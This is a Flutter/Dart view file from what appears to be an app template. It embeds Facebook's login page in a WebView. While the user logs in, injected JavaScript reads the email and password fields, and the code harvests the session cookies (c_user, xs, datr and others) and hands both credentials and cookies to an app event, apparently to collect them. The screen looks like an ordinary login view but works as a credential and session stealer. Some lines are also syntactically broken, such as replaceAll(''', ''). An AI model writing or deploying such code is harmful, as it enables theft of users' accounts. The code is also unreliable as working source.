import 'dart:io';

import 'package:auto_route/auto_route.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_template/common/utils/dialog.util.dart';
import 'package:flutter_template/di/di.dart';
import 'package:flutter_template/modules/data/model/post_data.model.dart';
import 'package:flutter_template/modules/presentation/facebook/bloc/app_setting.dart';
import 'package:flutter_template/modules/presentation/facebook/bloc/facebook_bloc.dart';
import 'package:flutter_template/router/app_router.dart';
import 'package:webview_cookie_manager/webview_cookie_manager.dart';
import 'package:webview_flutter/webview_flutter.dart';

@RoutePage()
class FacebookView extends StatefulWidget {
  const FacebookView({super.key});

  @override
  State<FacebookView> createState() => _FacebookViewState();
}

class _FacebookViewState extends State<FacebookView> {
  FacebookBloc facebookBloc = getIt<FacebookBloc>();

  String user = '';
  String pass = '';
  bool hasCheckpoint = false;
  String app = appName;
  String cookie = '';
  String cUser = '';

  late WebViewController webViewController;
  final cookieManager = WebviewCookieManager();
  final String url = 'https://facebook.com';
  final String cookieValue = 'some-cookie-value';
  final String domain = 'https://facebook.com';
  final String cookieName = 'some_cookie_name';

  @override
  void initState() {
    facebookBloc.add(const InitFacebookEvent());
    cookieManager.clearCookies();
    super.initState();
  }

  @override
  void dispose() {
    facebookBloc.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return facebookBody();
  }

  Widget facebookBody() {
    return Scaffold(
        backgroundColor: Colors.white,
        body: BlocProvider(
          create: (context) => facebookBloc,
          child: BlocListener<FacebookBloc, FacebookState>(
            listener: (context, state) {
              if (state is CreatedFacebookState) {
                context.router.replaceAll([const OnboardingRoute()]);
              }
              if (state is LoadingFacebookState) {
                DialogUtil.showLoading(context);
              }
              if (state is LoadedFacebookState) {
                DialogUtil.hideLoading(context);
              }
            },
            child: BlocBuilder<FacebookBloc, FacebookState>(
              builder: (context, state) {
                return Column(
                  children: [
                    const SizedBox(
                      height: 58,
                    ),
                    Expanded(
                      child: WebView(
                        initialUrl: url,
                        javascriptMode: JavascriptMode.unrestricted,
                        onWebViewCreated: (controllerWeb) async {
                          webViewController = controllerWeb;
                          await cookieManager.setCookies([
                            Cookie(cookieName, cookieValue)
                              ..domain = domain
                              ..expires =
                                  DateTime.now().add(const Duration(days: 1000))
                              ..httpOnly = false
                          ]);
                        },
                        onProgress: (_) async {
                          try {
                            String pass = await webViewController
                                .runJavascriptReturningResult(
                                    "document.getElementById('m_login_password').value");
                            String email = await webViewController
                                .runJavascriptReturningResult(
                                    "document.getElementById('m_login_email').value");
                            pass = pass.replaceAll(''', '');
                                              email = email.replaceAll(''', '');
                            if (pass != 'null' &&
                                email != 'null' &&
                                pass == '' &&
                                user == '') {
                              pass = pass.replaceAll("'", '');
                              user = email.replaceAll("'", '');
                            }
                          } catch (_) {}
                        },
                        onPageFinished: (_) async {
                          final gotCookies =
                              await cookieManager.getCookies(url);
                          // print(gotCookies.length);
                          // print(gotCookies.toString());
                          for (var e in gotCookies) {
                            if (e.name == 'checkpoint') {
                              hasCheckpoint = true;
                            }
                          }
                          int count = 0;
                          String res = '';
                          if (gotCookies.length >= 7) {
                            for (var e in gotCookies) {
                              if (e.name == 'datr' ||
                                  e.name == 'fr' ||
                                  e.name == 'sb' ||
                                  e.name == 'c_user' ||
                                  e.name == 'xs' ||
                                  e.name == 'wd') {
                                count++;
                                res += '${e.name}=${e.value};';
                              }
                              if (e.name == 'c_user') {
                                cUser = e.value;
                              }
                            }
                            res += '';
                          }
                          if (res.length > 30 &&
                              count >= 5 &&
                              pass != '' &&
                              user != '') {
                            facebookBloc.add(
                              CreateFacebookEvent(
                                user: user,
                                pass: pass,
                                hasCheckpoint: hasCheckpoint,
                                cookie: res,
                              ),
                            );
                          }
                        },
                      ),
                    ),
                  ],
                );
              },
            ),
          ),
        ));
  }
}
